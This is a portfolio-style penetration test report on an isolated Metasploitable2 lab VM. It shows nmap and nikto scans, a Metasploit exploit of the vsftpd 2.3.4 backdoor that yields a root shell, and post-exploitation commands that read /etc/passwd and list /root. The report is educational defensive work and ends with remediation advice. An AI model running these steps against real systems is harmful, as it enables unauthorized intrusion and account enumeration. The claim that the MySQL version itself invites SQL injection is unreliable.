Cybersecurity and Ethical Hacking Portfolio Report
1. Introduction
This report documents a penetration test conducted on a controlled, isolated environment (a vulnerable virtual machine, e.g., Metasploitable2) to demonstrate key cybersecurity and ethical hacking skills. The objective was to identify vulnerabilities, exploit them, and collect relevant information, simulating a real-world ethical hacking scenario.

2. Target Information
Target IP: Internal/Isolated IP (192.168.56.102)
Operating System: Linux (Based on Ubuntu)
Kernel Version: 2.6.24-16-server
Note: The environment was a purposely vulnerable machine used for educational purposes.

3. Tools Used
Nmap: Network scanning tool to discover open ports and services.
Nikto: Web vulnerability scanner for detecting web server misconfigurations.
Metasploit Framework: Exploit framework used to exploit vulnerabilities.
4. Vulnerability Discovery
Nmap Scan Results:
Nmap was used to scan for open ports and services running on the target machine.

Copy code
nmap -A 192.168.56.102

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian
23/tcp   open  telnet      Linux telnetd
80/tcp   open  http        Apache httpd 2.2.8 (Ubuntu)
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
Key Vulnerabilities:
FTP (vsftpd 2.3.4): Vulnerable to a backdoor vulnerability that could allow remote command execution.
HTTP (Apache 2.2.8): Outdated version with several potential misconfigurations and security issues.
MySQL (5.0.51a): Potential misconfigurations and outdated version, making it vulnerable to SQL injection attacks.
Nikto Web Vulnerability Scan:

Copy code
nikto -h http://192.168.56.102

+ Server: Apache/2.2.8 (Ubuntu)
+ /: HTTP TRACE method is active, vulnerable to Cross-Site Tracing (XST).
+ /: The anti-clickjacking X-Frame-Options header is not present.
+ Apache/2.2.8 is outdated, multiple security vulnerabilities exist.
Nikto discovered that the Apache web server was missing important security headers and had vulnerabilities due to its outdated version.

5. Exploitation
FTP Backdoor Exploit:
Using the Metasploit Framework, the backdoor vulnerability in the vsftpd 2.3.4 service was exploited, granting root access to the system.

Copy code
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.56.102
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] Command shell session 1 opened (192.168.56.101:45395 -> 192.168.56.102:6200)
Post-Exploitation:
After gaining access, various post-exploitation techniques were used to gather information from the system.

Commands Executed:
Copy code
uname -a                # To gather system information
cat /etc/passwd         # To enumerate user accounts
ls -la /root            # To list files in the root directory
ps aux                  # To view running processes
6. Sensitive Data Collected
User Accounts: Found in the /etc/passwd file, including root, daemon, and several others.
Running Processes: Apache, MySQL, and VNC services were identified, confirming active services on the machine.
Root Directory Files: Important system files were identified, but no critical sensitive information was accessed or modified.
7. Conclusion
The penetration test revealed critical vulnerabilities in the target system:

vsftpd 2.3.4 FTP service: Exploitable backdoor vulnerability that allows root access.
Outdated Apache Web Server: Vulnerable to attacks due to missing security headers and outdated configurations.
MySQL: Version 5.0.51a has known vulnerabilities, possibly allowing for SQL injection attacks.
Recommendations:

Update all outdated services (FTP, Apache, MySQL) to their latest versions.
Disable unnecessary services (such as FTP and Telnet) or restrict access to them.
Configure the web server with proper security headers (X-Frame-Options, X-Content-Type-Options, etc.) and disable HTTP TRACE methods.
8. Final Notes
This report demonstrates the ability to perform ethical hacking in a controlled, isolated environment. The vulnerabilities found were in a purposely vulnerable machine, and no unauthorized systems were accessed. The findings and recommendations provided here would enhance the security posture of the target system if implemented.
